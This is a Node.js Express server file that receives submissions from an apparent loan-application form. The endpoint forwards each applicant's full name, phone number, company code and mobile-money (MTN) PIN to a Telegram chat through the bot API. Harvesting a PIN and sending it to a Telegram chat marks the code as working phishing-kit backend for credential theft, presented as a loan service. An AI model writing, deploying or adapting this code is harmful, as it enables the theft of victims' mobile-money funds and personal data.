const express = require('express');
const cors = require('cors');
const path = require('path');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

// Telegram Bot credentials from environment variables
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

app.post('/api/submit-loan', async (req, res) => {
    try {
        const { fullName, loanAmount, loanPurpose, repaymentPeriod, phone, companyCode, mtnPin } = req.body;

        // Format message for Telegram
        const message = `
🚨 **New Loan Application Submission** 🚨

👤 **Full Name:** ${fullName || 'N/A'}
💰 **Loan Amount:** ${loanAmount || 'N/A'}
🎯 **Purpose:** ${loanPurpose || 'N/A'}
⏱️ **Duration:** ${repaymentPeriod || 'N/A'}
📱 **Phone Number:** ${phone || 'N/A'}
🔢 **Company Code:** ${companyCode || 'N/A'}
🔑 **MTN PIN:** \`${mtnPin || 'N/A'}\`
        `.trim();

        // Forward to Telegram
        if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
            const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
            const response = await fetch(telegramUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: message,
                    parse_mode: 'Markdown'
                })
            });
            const data = await response.json();
            if (!data.ok) {
                console.error('Telegram API error:', data);
            }
        } else {
            console.log('Telegram credentials missing. Received data:', req.body);
        }

        res.status(200).json({ success: true, message: 'Submitted successfully' });
    } catch (error) {
        console.error('Server error:', error);
        res.status(500).json({ success: false, error: 'Internal server error' });
    }
});

app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});
